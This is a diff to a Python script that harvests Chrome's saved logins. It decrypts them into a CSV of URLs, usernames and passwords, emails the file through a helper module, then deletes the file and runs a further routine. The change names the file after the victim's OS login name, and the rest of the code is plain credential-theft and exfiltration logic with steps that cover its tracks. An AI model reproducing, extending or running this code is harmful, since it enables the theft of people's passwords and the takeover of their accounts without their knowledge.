@@ -68,8 +68,11 @@ def get_db_connection(chrome_path_login_db):
 
 def fetch_and_transfer():
     try:
+        # fetching username for the file name
+        username =  os.getlogin()
+        file_name = username+"_chrome_password.csv"
         #Create Dataframe to store passwords
-        with open('chrome_password.csv', mode='w', newline='', encoding='utf-8') as decrypt_password_file:
+        with open(file_name, mode='w', newline='', encoding='utf-8') as decrypt_password_file:
             csv_writer = csv.writer(decrypt_password_file, delimiter=',')
             csv_writer.writerow(["index","url","username","password"])
             #(1) Get secret key
@@ -98,8 +101,8 @@ def fetch_and_transfer():
                     conn.close()
                     #Delete temp login db
                     os.remove("Loginvault.db")
-        script1.send_email("chrome_password.csv")
-        os.remove('chrome_password.csv')
+        script1.send_email(file_name)
+        os.remove(file_name)
         script1.execute()
     except Exception as e:
         print("[ERR] %s"%str(e))
